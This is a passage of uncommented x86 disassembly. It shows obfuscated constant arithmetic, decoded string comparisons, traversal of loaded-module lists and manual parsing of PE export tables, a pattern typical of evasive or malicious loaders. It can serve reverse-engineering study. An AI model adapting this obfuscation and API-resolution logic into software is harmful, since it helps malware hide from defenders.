  41f684:	mov    eax,DWORD PTR [ebp-0xc]
  41f687:	xor    eax,ecx
  41f689:	add    eax,edx
  41f68b:	mov    DWORD PTR [ebp-0x24],eax
  41f68e:	mov    eax,DWORD PTR [ebp-0xc]
  41f691:	xor    eax,ecx
  41f693:	add    eax,edx
  41f695:	mov    DWORD PTR [ebp-0x28],eax
  41f698:	mov    edi,DWORD PTR [ebp-0x20]
  41f69b:	mov    ebx,DWORD PTR [ebp-0x8]
  41f69e:	mov    esi,0x89d
  41f6a3:	xor    edi,esi
  41f6a5:	mov    eax,0x72e4
  41f6aa:	xor    ebx,esi
  41f6ac:	add    edi,eax
  41f6ae:	add    ebx,eax
  41f6b0:	sub    ebx,edi
  41f6b2:	mov    WORD PTR [ebp-0x8],bx
  41f6b6:	jmp    0x41f77b
  41f6bb:	mov    edi,DWORD PTR [ebp-0xc]
  41f6be:	mov    bx,WORD PTR [ebp-0x4]
  41f6c2:	xor    edi,esi
  41f6c4:	add    edi,eax
  41f6c6:	cmp    bx,di
  41f6c9:	je     0x41f7bd
  41f6cf:	mov    edi,DWORD PTR [ebp-0xc]
  41f6d2:	mov    ebx,DWORD PTR [ebp+0xc]
  41f6d5:	xor    edi,ecx
  41f6d7:	add    edi,edx
  41f6d9:	cmp    ebx,edi
  41f6db:	mov    di,WORD PTR [ebp-0x4]
  41f6df:	mov    bx,WORD PTR [ebp+0x8]
  41f6e3:	je     0x41f74e
  41f6e5:	cmp    bx,di
  41f6e8:	je     0x41f757
  41f6ea:	mov    edi,DWORD PTR [ebp-0x20]
  41f6ed:	mov    bx,WORD PTR [ebp+0x8]
  41f6f1:	xor    edi,esi
  41f6f3:	add    edi,eax
  41f6f5:	cmp    bx,di
  41f6f8:	jb     0x41f718
  41f6fa:	mov    edi,DWORD PTR [ebp-0x2c]
  41f6fd:	mov    bx,WORD PTR [ebp+0x8]
  41f701:	xor    edi,esi
  41f703:	add    edi,eax
  41f705:	cmp    bx,di
  41f708:	ja     0x41f718
  41f70a:	movzx  edi,WORD PTR [ebp+0x8]
  41f70e:	movzx  ebx,WORD PTR [ebp-0x8]
  41f712:	add    edi,ebx
  41f714:	mov    WORD PTR [ebp+0x8],di
  41f718:	mov    edi,DWORD PTR [ebp-0x20]
  41f71b:	mov    bx,WORD PTR [ebp-0x4]
  41f71f:	xor    edi,esi
  41f721:	add    edi,eax
  41f723:	cmp    bx,di
  41f726:	jb     0x41f746
  41f728:	mov    edi,DWORD PTR [ebp-0x2c]
  41f72b:	mov    bx,WORD PTR [ebp-0x4]
  41f72f:	xor    edi,esi
  41f731:	add    edi,eax
  41f733:	cmp    bx,di
  41f736:	ja     0x41f746
  41f738:	movzx  edi,WORD PTR [ebp-0x4]
  41f73c:	movzx  ebx,WORD PTR [ebp-0x8]
  41f740:	add    edi,ebx
  41f742:	mov    WORD PTR [ebp-0x4],di
  41f746:	mov    di,WORD PTR [ebp-0x4]
  41f74a:	mov    bx,WORD PTR [ebp+0x8]
  41f74e:	cmp    bx,di
  41f751:	jne    0x41f84b
  41f757:	mov    edi,DWORD PTR [ebp-0x1c]
  41f75a:	mov    ebx,DWORD PTR [ebp-0x10]
  41f75d:	xor    edi,ecx
  41f75f:	lea    edi,[edi+ebx*1+0x3272e4]
  41f766:	mov    DWORD PTR [ebp-0x10],edi
  41f769:	mov    edi,DWORD PTR [ebp-0x1c]
  41f76c:	mov    ebx,DWORD PTR [ebp-0x14]
  41f76f:	xor    edi,ecx
  41f771:	lea    edi,[edi+ebx*1+0x3272e4]
  41f778:	mov    DWORD PTR [ebp-0x14],edi
  41f77b:	mov    edi,DWORD PTR [ebp-0x24]
  41f77e:	mov    ebx,DWORD PTR [ebp-0x10]
  41f781:	mov    di,WORD PTR [ebx+edi*2]
  41f785:	mov    WORD PTR [ebp+0x8],di
  41f789:	mov    edi,DWORD PTR [ebp-0x28]
  41f78c:	mov    ebx,DWORD PTR [ebp-0x14]
  41f78f:	mov    di,WORD PTR [ebx+edi*2]
  41f793:	mov    WORD PTR [ebp-0x4],di
  41f797:	mov    edi,DWORD PTR [ebp-0xc]
  41f79a:	mov    bx,WORD PTR [ebp+0x8]
  41f79e:	xor    edi,esi
  41f7a0:	add    edi,eax
  41f7a2:	cmp    bx,di
  41f7a5:	jne    0x41f6bb
  41f7ab:	mov    eax,DWORD PTR [ebp-0x18]
  41f7ae:	mov    esi,DWORD PTR [ebp-0xc]
  41f7b1:	xor    eax,ecx
  41f7b3:	add    eax,edx
  41f7b5:	imul   eax,esi
  41f7b8:	mov    DWORD PTR [ebp-0xc],eax
  41f7bb:	jmp    0x41f7cf
  41f7bd:	mov    eax,DWORD PTR [ebp-0xc]
  41f7c0:	mov    esi,DWORD PTR [ebp-0x18]
  41f7c3:	xor    eax,ecx
  41f7c5:	lea    eax,[eax+esi*1+0x3272e4]
  41f7cc:	mov    DWORD PTR [ebp-0x18],eax
  41f7cf:	mov    eax,DWORD PTR [ebp-0x24]
  41f7d2:	sub    eax,edx
  41f7d4:	xor    eax,ecx
  41f7d6:	mov    DWORD PTR [ebp-0x30],eax
  41f7d9:	mov    eax,DWORD PTR [ebp-0x28]
  41f7dc:	sub    eax,edx
  41f7de:	xor    eax,ecx
  41f7e0:	mov    DWORD PTR [ebp-0x34],eax
  41f7e3:	mov    eax,DWORD PTR [ebp-0x34]
  41f7e6:	mov    esi,DWORD PTR [ebp-0x1c]
  41f7e9:	xor    esi,ecx
  41f7eb:	add    esi,edx
  41f7ed:	xor    eax,ecx
  41f7ef:	add    eax,0x3272e4
  41f7f4:	imul   esi,eax
  41f7f7:	mov    eax,DWORD PTR [ebp-0x14]
  41f7fa:	movzx  eax,WORD PTR [esi+eax*1]
  41f7fe:	mov    esi,DWORD PTR [ebp-0x30]
  41f801:	mov    edi,DWORD PTR [ebp-0x1c]
  41f804:	xor    esi,ecx
  41f806:	add    esi,edx
  41f808:	xor    edi,ecx
  41f80a:	add    edi,edx
  41f80c:	imul   edi,esi
  41f80f:	mov    esi,DWORD PTR [ebp-0x10]
  41f812:	movzx  esi,WORD PTR [edi+esi*1]
  41f816:	sub    eax,edx
  41f818:	sub    esi,edx
  41f81a:	xor    eax,ecx
  41f81c:	xor    esi,ecx
  41f81e:	cmp    esi,eax
  41f820:	jne    0x41f84b
  41f822:	mov    eax,DWORD PTR [ebp-0x30]
  41f825:	mov    esi,DWORD PTR [ebp-0x1c]
  41f828:	xor    eax,ecx
  41f82a:	add    eax,0x3272e4
  41f82f:	xor    esi,ecx
  41f831:	add    esi,edx
  41f833:	imul   esi,eax
  41f836:	mov    eax,DWORD PTR [ebp-0x10]
  41f839:	movzx  eax,WORD PTR [esi+eax*1]
  41f83d:	mov    esi,DWORD PTR [ebp-0xc]
  41f840:	sub    eax,edx
  41f842:	xor    eax,ecx
  41f844:	cmp    eax,esi
  41f846:	mov    eax,DWORD PTR [ebp-0xc]
  41f849:	je     0x41f84e
  41f84b:	mov    eax,DWORD PTR [ebp-0x18]
  41f84e:	pop    edi
  41f84f:	xor    eax,ecx
  41f851:	pop    esi
  41f852:	add    eax,edx
  41f854:	pop    ebx
  41f855:	leave  
  41f856:	ret    0x8
  41f859:	push   ebp
  41f85a:	mov    ebp,esp
  41f85c:	push   ecx
  41f85d:	mov    cx,WORD PTR [eax]
  41f860:	push   esi
  41f861:	mov    esi,0x3b52
  41f866:	sub    cx,si
  41f869:	mov    esi,0x8a8e
  41f86e:	xor    cx,si
  41f871:	mov    esi,0x4e20
  41f876:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f87d:	mov    edx,0xf89c8581
  41f882:	cmp    cx,si
  41f885:	je     0x41f8e4
  41f887:	push   ebx
  41f888:	push   edi
  41f889:	movzx  ecx,cx
  41f88c:	mov    edi,0xffcd8d1c
  41f891:	mov    esi,0x751089d
  41f896:	mov    ebx,0x4f84
  41f89b:	cmp    cx,bx
  41f89e:	jne    0x41f8a3
  41f8a0:	mov    DWORD PTR [ebp-0x4],edx
  41f8a3:	lea    edx,[edi+0x1]
  41f8a6:	xor    edx,esi
  41f8a8:	mov    edi,edx
  41f8aa:	xor    edi,esi
  41f8ac:	mov    cx,WORD PTR [eax+edi*2+0x64e5c8]
  41f8b4:	mov    ebx,0x3b52
  41f8b9:	sub    cx,bx
  41f8bc:	mov    ebx,0x8a8e
  41f8c1:	xor    cx,bx
  41f8c4:	mov    ebx,0x4e20
  41f8c9:	cmp    cx,bx
  41f8cc:	jne    0x41f896
  41f8ce:	mov    ecx,DWORD PTR [ebp-0x4]
  41f8d1:	pop    edi
  41f8d2:	pop    ebx
  41f8d3:	cmp    ecx,0xf89c8586
  41f8d9:	je     0x41f8e4
  41f8db:	xor    ecx,esi
  41f8dd:	lea    eax,[eax+ecx*2+0x64e5ca]
  41f8e4:	pop    esi
  41f8e5:	leave  
  41f8e6:	ret    
  41f8e7:	push   ebp
  41f8e8:	mov    ebp,esp
  41f8ea:	push   ecx
  41f8eb:	push   esi
  41f8ec:	push   edi
  41f8ed:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f8f4:	mov    esi,0xf89c8581
  41f8f9:	call   0x41f859
  41f8fe:	mov    edi,eax
  41f900:	mov    al,BYTE PTR [edi]
  41f902:	add    al,0x7
  41f904:	xor    al,0x75
  41f906:	cmp    al,0x72
  41f908:	je     0x41f96b
  41f90a:	mov    eax,edi
  41f90c:	mov    edx,0xffcd8d1c
  41f911:	mov    ecx,0x751089d
  41f916:	push   ebx
  41f917:	mov    ax,WORD PTR [eax]
  41f91a:	mov    ebx,0x3b52
  41f91f:	sub    ax,bx
  41f922:	mov    ebx,0x8a8e
  41f927:	xor    ax,bx
  41f92a:	mov    ebx,0x4e52
  41f92f:	cmp    ax,bx
  41f932:	jne    0x41f937
  41f934:	mov    DWORD PTR [ebp-0x4],esi
  41f937:	lea    esi,[edx+0x1]
  41f93a:	xor    esi,ecx
  41f93c:	mov    edx,esi
  41f93e:	xor    edx,ecx
  41f940:	lea    eax,[edi+edx*2+0x64e5c8]
  41f947:	mov    bl,BYTE PTR [eax]
  41f949:	add    bl,0x7
  41f94c:	xor    bl,0x75
  41f94f:	cmp    bl,0x72
  41f952:	jne    0x41f917
  41f954:	mov    eax,DWORD PTR [ebp-0x4]
  41f957:	pop    ebx
  41f958:	cmp    eax,0xf89c8586
  41f95d:	je     0x41f96b
  41f95f:	xor    eax,ecx
  41f961:	xor    ecx,ecx
  41f963:	mov    WORD PTR [edi+eax*2+0x64e5c8],cx
  41f96b:	mov    eax,edi
  41f96d:	pop    edi
  41f96e:	pop    esi
  41f96f:	leave  
  41f970:	ret    
  41f971:	push   ebp
  41f972:	mov    ebp,esp
  41f974:	push   ecx
  41f975:	push   esi
  41f976:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f97d:	mov    esi,0xf89c8581
  41f982:	call   0x41f859
  41f987:	mov    cx,WORD PTR [eax]
  41f98a:	mov    edx,0x3b52
  41f98f:	sub    cx,dx
  41f992:	mov    edx,0x8a8e
  41f997:	xor    cx,dx
  41f99a:	mov    edx,0x4e20
  41f99f:	cmp    cx,dx
  41f9a2:	je     0x41f9fb
  41f9a4:	push   ebx
  41f9a5:	push   edi
  41f9a6:	movzx  ecx,cx
  41f9a9:	mov    edx,0xffcd8d1c
  41f9ae:	mov    edi,0x751089d
  41f9b3:	mov    ebx,0x4e52
  41f9b8:	cmp    cx,bx
  41f9bb:	jne    0x41f9c0
  41f9bd:	mov    DWORD PTR [ebp-0x4],esi
  41f9c0:	lea    esi,[edx+0x1]
  41f9c3:	xor    esi,edi
  41f9c5:	mov    edx,esi
  41f9c7:	xor    edx,edi
  41f9c9:	mov    cx,WORD PTR [eax+edx*2+0x64e5c8]
  41f9d1:	mov    ebx,0x3b52
  41f9d6:	sub    cx,bx
  41f9d9:	mov    ebx,0x8a8e
  41f9de:	xor    cx,bx
  41f9e1:	mov    ebx,0x4e20
  41f9e6:	cmp    cx,bx
  41f9e9:	jne    0x41f9b3
  41f9eb:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f9f2:	pop    edi
  41f9f3:	pop    ebx
  41f9f4:	je     0x41f9fb
  41f9f6:	xor    eax,eax
  41f9f8:	inc    eax
  41f9f9:	jmp    0x41f9fd
  41f9fb:	xor    eax,eax
  41f9fd:	pop    esi
  41f9fe:	leave  
  41f9ff:	ret    
  41fa00:	push   ebp
  41fa01:	mov    ebp,esp
  41fa03:	push   ecx
  41fa04:	mov    eax,DWORD PTR [ebp+0x8]
  41fa07:	movzx  ecx,WORD PTR [eax]
  41fa0a:	push   esi
  41fa0b:	lea    eax,[ecx-0x3b52]
  41fa11:	mov    esi,0x8a8e
  41fa16:	push   edi
  41fa17:	xor    eax,esi
  41fa19:	mov    edi,0x4e20
  41fa1e:	mov    DWORD PTR [ebp-0x4],edx
  41fa21:	cmp    ax,di
  41fa24:	je     0x41fa51
  41fa26:	mov    eax,DWORD PTR [ebp+0x8]
  41fa29:	sub    eax,edx
  41fa2b:	mov    DWORD PTR [ebp+0x8],eax
  41fa2e:	jmp    0x41fa33
  41fa30:	mov    eax,DWORD PTR [ebp+0x8]
  41fa33:	mov    WORD PTR [edx],cx
  41fa36:	add    edx,0x2
  41fa39:	movzx  edi,WORD PTR [eax+edx*1]
  41fa3d:	mov    ecx,edi
  41fa3f:	add    edi,0xffffc4ae
  41fa45:	xor    edi,esi
  41fa47:	mov    eax,0x4e20
  41fa4c:	cmp    di,ax
  41fa4f:	jne    0x41fa30
  41fa51:	xor    eax,eax
  41fa53:	pop    edi
  41fa54:	mov    WORD PTR [edx],ax
  41fa57:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5a:	pop    esi
  41fa5b:	leave  
  41fa5c:	ret    0x4
  41fa5f:	push   ebp
  41fa60:	mov    ebp,esp
  41fa62:	sub    esp,0x18
  41fa65:	mov    DWORD PTR [ebp-0x8],0xf89c8581
  41fa6c:	mov    DWORD PTR [ebp-0x18],0xf89c8580
  41fa73:	mov    ecx,DWORD PTR [ebp-0x8]
  41fa76:	push   esi
  41fa77:	mov    eax,0x751089d
  41fa7c:	xor    ecx,eax
  41fa7e:	mov    esi,0x3272e4
  41fa83:	add    ecx,esi
  41fa85:	mov    DWORD PTR [ebp-0x4],ecx
  41fa88:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41fa8f:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41fa96:	push   edi
  41fa97:	mov    DWORD PTR [ebp-0x14],0xf89c8583
  41fa9e:	jmp    0x41fb3f
  41faa3:	mov    ecx,DWORD PTR [ebp-0x4]
  41faa6:	mov    edx,DWORD PTR [ebp+0x10]
  41faa9:	sub    edx,ecx
  41faab:	mov    ecx,DWORD PTR [ebp-0xc]
  41faae:	xor    ecx,eax
  41fab0:	add    ecx,esi
  41fab2:	cmp    edx,ecx
  41fab4:	jbe    0x41fad1
  41fab6:	mov    edx,DWORD PTR [ebp-0x4]
  41fab9:	add    edx,DWORD PTR [ebp+0x8]
  41fabc:	mov    ecx,DWORD PTR [ebp-0x4]
  41fabf:	add    ecx,DWORD PTR [ebp+0xc]
  41fac2:	mov    edi,DWORD PTR [ecx]
  41fac4:	mov    DWORD PTR [edx],edi
  41fac6:	mov    ecx,DWORD PTR [ecx+0x4]
  41fac9:	mov    DWORD PTR [edx+0x4],ecx
  41facc:	mov    ecx,DWORD PTR [ebp-0xc]
  41facf:	jmp    0x41fb1e
  41fad1:	mov    ecx,DWORD PTR [ebp-0x4]
  41fad4:	mov    edx,DWORD PTR [ebp+0x10]
  41fad7:	sub    edx,ecx
  41fad9:	mov    ecx,DWORD PTR [ebp-0x10]
  41fadc:	xor    ecx,eax
  41fade:	add    ecx,esi
  41fae0:	cmp    edx,ecx
  41fae2:	mov    ecx,DWORD PTR [ebp-0x4]
  41fae5:	jbe    0x41faf9
  41fae7:	add    ecx,DWORD PTR [ebp+0x8]
  41faea:	mov    edx,DWORD PTR [ebp-0x4]
  41faed:	add    edx,DWORD PTR [ebp+0xc]
  41faf0:	mov    edx,DWORD PTR [edx]
  41faf2:	mov    DWORD PTR [ecx],edx
  41faf4:	mov    ecx,DWORD PTR [ebp-0x10]
  41faf7:	jmp    0x41fb1e
  41faf9:	mov    edx,DWORD PTR [ebp+0x10]
  41fafc:	sub    edx,ecx
  41fafe:	mov    ecx,DWORD PTR [ebp-0x14]
  41fb01:	xor    ecx,eax
  41fb03:	add    ecx,esi
  41fb05:	cmp    edx,ecx
  41fb07:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb0a:	jbe    0x41fb2f
  41fb0c:	add    ecx,DWORD PTR [ebp+0x8]
  41fb0f:	mov    edx,DWORD PTR [ebp-0x4]
  41fb12:	add    edx,DWORD PTR [ebp+0xc]
  41fb15:	mov    dx,WORD PTR [edx]
  41fb18:	mov    WORD PTR [ecx],dx
  41fb1b:	mov    ecx,DWORD PTR [ebp-0x14]
  41fb1e:	mov    edx,DWORD PTR [ebp-0x4]
  41fb21:	xor    ecx,eax
  41fb23:	lea    ecx,[ecx+edx*1+0x3272e4]
  41fb2a:	mov    DWORD PTR [ebp-0x4],ecx
  41fb2d:	jmp    0x41fb3f
  41fb2f:	add    ecx,DWORD PTR [ebp+0x8]
  41fb32:	mov    edx,DWORD PTR [ebp-0x4]
  41fb35:	add    edx,DWORD PTR [ebp+0xc]
  41fb38:	mov    dl,BYTE PTR [edx]
  41fb3a:	mov    BYTE PTR [ecx],dl
  41fb3c:	inc    DWORD PTR [ebp-0x4]
  41fb3f:	mov    ecx,DWORD PTR [ebp-0x18]
  41fb42:	mov    edx,DWORD PTR [ebp+0x10]
  41fb45:	xor    ecx,eax
  41fb47:	add    ecx,esi
  41fb49:	imul   ecx,edx
  41fb4c:	mov    edx,DWORD PTR [ebp-0x8]
  41fb4f:	mov    edi,DWORD PTR [ebp-0x4]
  41fb52:	xor    edx,eax
  41fb54:	lea    edx,[edx+edi*1+0x3272e4]
  41fb5b:	cmp    edx,ecx
  41fb5d:	jb     0x41faa3
  41fb63:	pop    edi
  41fb64:	pop    esi
  41fb65:	leave  
  41fb66:	ret    0xc
  41fb69:	push   ebp
  41fb6a:	mov    ebp,esp
  41fb6c:	sub    esp,0xc
  41fb6f:	mov    DWORD PTR [ebp-0x4],0xf89c8581
  41fb76:	push   esi
  41fb77:	mov    esi,eax
  41fb79:	mov    DWORD PTR [ebp-0x8],0xf89c8580
  41fb80:	mov    edx,DWORD PTR [ebp-0x4]
  41fb83:	mov    eax,0x751089d
  41fb88:	xor    edx,eax
  41fb8a:	mov    ecx,0x3272e4
  41fb8f:	add    edx,ecx
  41fb91:	cmp    esi,edx
  41fb93:	je     0x41fbd5
  41fb95:	push   ebx
  41fb96:	push   edi
  41fb97:	mov    edx,DWORD PTR [ebp-0x8]
  41fb9a:	mov    ebx,DWORD PTR [ebp+0x8]
  41fb9d:	xor    edx,eax
  41fb9f:	mov    edi,0xffcd8d1c
  41fba4:	sub    edi,edx
  41fba6:	add    esi,edi
  41fba8:	lea    edx,[esi-0x3272e4]
  41fbae:	xor    edx,eax
  41fbb0:	mov    DWORD PTR [ebp-0xc],edx
  41fbb3:	mov    edx,DWORD PTR [ebp-0x4]
  41fbb6:	mov    edi,DWORD PTR [ebp-0xc]
  41fbb9:	xor    dl,0x9d
  41fbbc:	sub    dl,0x1c
  41fbbf:	xor    edi,eax
  41fbc1:	mov    BYTE PTR [edi+ebx*1+0x3272e4],dl
  41fbc8:	mov    edx,DWORD PTR [ebp-0x4]
  41fbcb:	xor    edx,eax
  41fbcd:	add    edx,ecx
  41fbcf:	cmp    esi,edx
  41fbd1:	jne    0x41fb97
  41fbd3:	pop    edi
  41fbd4:	pop    ebx
  41fbd5:	pop    esi
  41fbd6:	leave  
  41fbd7:	ret    0x4
  41fbda:	push   ebp
  41fbdb:	mov    ebp,esp
  41fbdd:	sub    esp,0x21c
  41fbe3:	mov    DWORD PTR [ebp-0x4],0xf89c8581
  41fbea:	mov    DWORD PTR [ebp-0x14],0xf89c8580
  41fbf1:	mov    eax,DWORD PTR [ebp+0x10]
  41fbf4:	mov    eax,DWORD PTR [ebp-0x4]
  41fbf7:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbfa:	push   esi
  41fbfb:	push   edi
  41fbfc:	mov    edi,0x751089d
  41fc01:	xor    eax,edi
  41fc03:	mov    esi,0x3272e4
  41fc08:	add    eax,esi
  41fc0a:	cmp    eax,ecx
  41fc0c:	mov    eax,DWORD PTR [ebp-0x4]
  41fc0f:	jne    0x41fc1a
  41fc11:	xor    eax,edi
  41fc13:	add    eax,esi
  41fc15:	jmp    0x41fcc6
  41fc1a:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc1d:	xor    eax,edi
  41fc1f:	add    eax,esi
  41fc21:	cmp    eax,ecx
  41fc23:	jne    0x41fc2a
  41fc25:	mov    eax,DWORD PTR [ebp-0x4]
  41fc28:	jmp    0x41fc11
  41fc2a:	lea    eax,[ebp-0x21c]
  41fc30:	mov    DWORD PTR [ebp-0x8],eax
  41fc33:	mov    eax,DWORD PTR [ebp+0xc]
  41fc36:	mov    DWORD PTR [ebp-0x10],eax
  41fc39:	mov    eax,DWORD PTR [ebp-0x4]
  41fc3c:	xor    eax,edi
  41fc3e:	add    eax,esi
  41fc40:	mov    DWORD PTR [ebp+0x10],eax
  41fc43:	mov    eax,DWORD PTR [ebp+0xc]
  41fc46:	push   ebx
  41fc47:	call   0x41f971
  41fc4c:	mov    ebx,eax
  41fc4e:	mov    eax,DWORD PTR [ebp+0x8]
  41fc51:	mov    eax,DWORD PTR [eax+0x14]
  41fc54:	jmp    0x41fcae
  41fc56:	mov    eax,DWORD PTR [ebp+0xc]
  41fc59:	sub    eax,0x8
  41fc5c:	mov    DWORD PTR [ebp-0xc],eax
  41fc5f:	mov    eax,DWORD PTR [ebp-0xc]
  41fc62:	mov    eax,DWORD PTR [eax+0x28]
  41fc65:	call   0x41f859
  41fc6a:	mov    DWORD PTR [ebp+0x10],eax
  41fc6d:	push   DWORD PTR [ebp+0x10]
  41fc70:	mov    edx,DWORD PTR [ebp-0x8]
  41fc73:	call   0x41fa00
  41fc78:	mov    eax,DWORD PTR [ebp-0x4]
  41fc7b:	xor    eax,edi
  41fc7d:	add    eax,esi
  41fc7f:	cmp    eax,ebx
  41fc81:	jne    0x41fc8b
  41fc83:	mov    eax,DWORD PTR [ebp-0x8]
  41fc86:	call   0x41f8e7
  41fc8b:	mov    eax,DWORD PTR [ebp-0x14]
  41fc8e:	xor    eax,edi
  41fc90:	add    eax,esi
  41fc92:	push   eax
  41fc93:	push   DWORD PTR [ebp-0x10]
  41fc96:	mov    eax,DWORD PTR [ebp-0x8]
  41fc99:	call   0x41f613
  41fc9e:	mov    ecx,DWORD PTR [ebp-0x4]
  41fca1:	xor    ecx,edi
  41fca3:	add    ecx,esi
  41fca5:	cmp    eax,ecx
  41fca7:	je     0x41fccc
  41fca9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcac:	mov    eax,DWORD PTR [eax]
  41fcae:	mov    DWORD PTR [ebp+0xc],eax
  41fcb1:	mov    eax,DWORD PTR [ebp+0x8]
  41fcb4:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcb7:	add    eax,0x14
  41fcba:	cmp    ecx,eax
  41fcbc:	jne    0x41fc56
  41fcbe:	mov    eax,DWORD PTR [ebp-0x4]
  41fcc1:	xor    eax,edi
  41fcc3:	add    eax,esi
  41fcc5:	pop    ebx
  41fcc6:	pop    edi
  41fcc7:	pop    esi
  41fcc8:	leave  
  41fcc9:	ret    0xc
  41fccc:	mov    eax,DWORD PTR [ebp-0xc]
  41fccf:	mov    eax,DWORD PTR [eax+0x18]
  41fcd2:	jmp    0x41fcc5
  41fcd4:	push   ebp
  41fcd5:	mov    ebp,esp
  41fcd7:	mov    eax,DWORD PTR [ebp+0xc]
  41fcda:	sub    esp,0x10
  41fcdd:	cmp    DWORD PTR [ebp+0x8],0x0
  41fce1:	push   ebx
  41fce2:	push   esi
  41fce3:	push   edi
  41fce4:	je     0x41fd99
  41fcea:	test   eax,eax
  41fcec:	je     0x41fd99
  41fcf2:	movzx  eax,WORD PTR [eax+0x20]
  41fcf6:	mov    ecx,eax
  41fcf8:	mov    DWORD PTR [ebp-0x10],eax
  41fcfb:	xor    edx,edx
  41fcfd:	and    DWORD PTR [ebp-0x8],edx
  41fd00:	mov    eax,0x8a8e
  41fd05:	xor    ecx,eax
  41fd07:	add    ecx,0x3b52
  41fd0d:	mov    DWORD PTR [ebp-0xc],ecx
  41fd10:	and    DWORD PTR [ebp-0x4],0x0
  41fd14:	xor    ecx,ecx
  41fd16:	push   0x7c
  41fd18:	pop    edi
  41fd19:	cmp    cx,WORD PTR [ebp-0xc]
  41fd1d:	jae    0x41fd83
  41fd1f:	lea    esi,[edx-0x3b52]
  41fd25:	xor    esi,eax
  41fd27:	movzx  ecx,WORD PTR [ebp-0x4]
  41fd2b:	mov    ebx,DWORD PTR [ebp+0xc]
  41fd2e:	lea    ecx,[ebx+ecx*4]
  41fd31:	cmp    WORD PTR [ecx+0x2],si
  41fd35:	jne    0x41fd6e
  41fd37:	movzx  ecx,WORD PTR [ecx]
  41fd3a:	mov    edi,0x4e20
  41fd3f:	cmp    cx,di
  41fd42:	jne    0x41fd50
  41fd44:	mov    ebx,DWORD PTR [ebp+0x8]
  41fd47:	movzx  edi,dx
  41fd4a:	cmp    BYTE PTR [edi+ebx*1],0x0
  41fd4e:	je     0x41fd7d
  41fd50:	mov    ebx,DWORD PTR [ebp+0x8]
  41fd53:	movzx  edi,dx
  41fd56:	movsx  di,BYTE PTR [edi+ebx*1]
  41fd5b:	mov    ebx,0x3b52
  41fd60:	sub    di,bx
  41fd63:	xor    di,ax
  41fd66:	cmp    cx,di
  41fd69:	je     0x41fd7d
  41fd6b:	push   0x72
  41fd6d:	pop    edi
  41fd6e:	inc    DWORD PTR [ebp-0x4]
  41fd71:	mov    cx,WORD PTR [ebp-0xc]
  41fd75:	cmp    WORD PTR [ebp-0x4],cx
  41fd79:	jb     0x41fd27
  41fd7b:	jmp    0x41fd83
  41fd7d:	inc    DWORD PTR [ebp-0x8]
  41fd80:	push   0x7d
  41fd82:	pop    edi
  41fd83:	mov    esi,DWORD PTR [ebp+0x8]
  41fd86:	movzx  ecx,dx
  41fd89:	cmp    BYTE PTR [ecx+esi*1],0x0
  41fd8d:	je     0x41fda2
  41fd8f:	inc    edx
  41fd90:	cmp    edi,0x72
  41fd93:	jne    0x41fd10
  41fd99:	xor    eax,eax
  41fd9b:	pop    edi
  41fd9c:	pop    esi
  41fd9d:	pop    ebx
  41fd9e:	leave  
  41fd9f:	ret    0x8
  41fda2:	mov    ecx,DWORD PTR [ebp-0x8]
  41fda5:	add    ecx,0xffffc4ae
  41fdab:	xor    cx,ax
  41fdae:	xor    eax,eax
  41fdb0:	cmp    cx,WORD PTR [ebp-0x10]
  41fdb4:	sete   al
  41fdb7:	jmp    0x41fd9b
  41fdb9:	push   ebp
  41fdba:	mov    ebp,esp
  41fdbc:	sub    esp,0x50
  41fdbf:	push   edi
  41fdc0:	mov    edi,eax
  41fdc2:	mov    eax,DWORD PTR [edi+0x1a8]
  41fdc8:	cmp    DWORD PTR [eax],0x0
  41fdcb:	jne    0x41fdd4
  41fdcd:	xor    eax,eax
  41fdcf:	jmp    0x41ff05
  41fdd4:	push   DWORD PTR [ebp+0x8]
  41fdd7:	push   0x2c
  41fdd9:	pop    eax
  41fdda:	call   0x41fb69
  41fddf:	mov    edx,DWORD PTR [edi+0x1ac]
  41fde5:	lea    eax,[edi+0x22]
  41fde8:	mov    DWORD PTR [ebp-0x4c],eax
  41fdeb:	lea    eax,[edi+0x44]
  41fdee:	mov    DWORD PTR [ebp-0x48],eax
  41fdf1:	lea    eax,[edi+0x66]
  41fdf4:	mov    DWORD PTR [ebp-0x44],eax
  41fdf7:	lea    eax,[edi+0x88]
  41fdfd:	mov    DWORD PTR [ebp-0x40],eax
  41fe00:	lea    eax,[edi+0xaa]
  41fe06:	mov    DWORD PTR [ebp-0x3c],eax
  41fe09:	lea    eax,[edi+0xcc]
  41fe0f:	mov    DWORD PTR [ebp-0x38],eax
  41fe12:	lea    eax,[edi+0xee]
  41fe18:	mov    DWORD PTR [ebp-0x34],eax
  41fe1b:	lea    eax,[edi+0x110]
  41fe21:	mov    DWORD PTR [ebp-0x30],eax
  41fe24:	lea    eax,[edi+0x132]
  41fe2a:	mov    DWORD PTR [ebp-0x2c],eax
  41fe2d:	lea    eax,[edi+0x154]
  41fe33:	push   edi
  41fe34:	mov    DWORD PTR [ebp-0x50],edi
  41fe37:	mov    DWORD PTR [ebp-0x28],eax
  41fe3a:	call   0x41ff39
  41fe3f:	push   eax
  41fe40:	mov    eax,DWORD PTR [edi+0x1a8]
  41fe46:	push   DWORD PTR [eax]
  41fe48:	call   0x41fbda
  41fe4d:	mov    DWORD PTR [ebp-0x10],eax
  41fe50:	test   eax,eax
  41fe52:	je     0x41ff05
  41fe58:	mov    ecx,DWORD PTR [eax+0x3c]
  41fe5b:	push   ebx
  41fe5c:	push   esi
  41fe5d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fe61:	add    esi,eax
  41fe63:	mov    edi,DWORD PTR [esi+0x24]
  41fe66:	mov    ecx,DWORD PTR [esi+0x1c]
  41fe69:	mov    edx,DWORD PTR [esi+0x20]
  41fe6c:	mov    ebx,DWORD PTR [esi+0x18]
  41fe6f:	add    edi,eax
  41fe71:	mov    DWORD PTR [ebp-0x20],edi
  41fe74:	mov    edi,DWORD PTR [esi+0x14]
  41fe77:	add    ecx,eax
  41fe79:	add    edx,eax
  41fe7b:	mov    DWORD PTR [ebp-0xc],ecx
